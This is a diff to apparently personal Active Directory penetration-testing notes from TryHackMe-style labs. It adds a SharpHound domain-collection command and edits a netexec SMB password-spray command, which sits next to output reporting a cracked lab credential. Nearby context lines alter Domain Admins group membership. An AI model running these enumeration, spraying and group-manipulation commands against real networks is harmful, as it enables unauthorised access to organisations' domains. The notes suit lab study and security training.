@@ -68,6 +68,8 @@
     / net group "Domain Admins" $username(which you controlled)  /del /domain
   
 ### sharphound    /sharphound to collect info, send to host, bloodhound to view the result
+  Sharphound.exe --Domain za.tryhackme.com --ExcludeDCs
+  
   / /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
   Import-Module .\SharpHound
 
@@ -89,7 +91,7 @@
   ### passwd spray
     /netexec   #pwned means right.    # -u listofname.txt
 
-    $ netexec smb 10.0.2.14 -u 'alice' -p 'Bendan1024' -d inmy.com --continue-on-success 
+    $ netexec smb 10.0.2.14 -u 'alice' -p 'Bendac' -d inmy.com --continue-on-success 
       SMB         10.0.2.14       445    WIN10-3ALICE     [*] Windows 10 Pro 10240 x64 (name:WIN10-3ALICE) (domain:inmy.com) (signing:False) (SMBv1:True)
       SMB         10.0.2.14       445    WIN10-3ALICE     [+] inmy.com\alice:Bendan1024 (Pwn3d!)
 
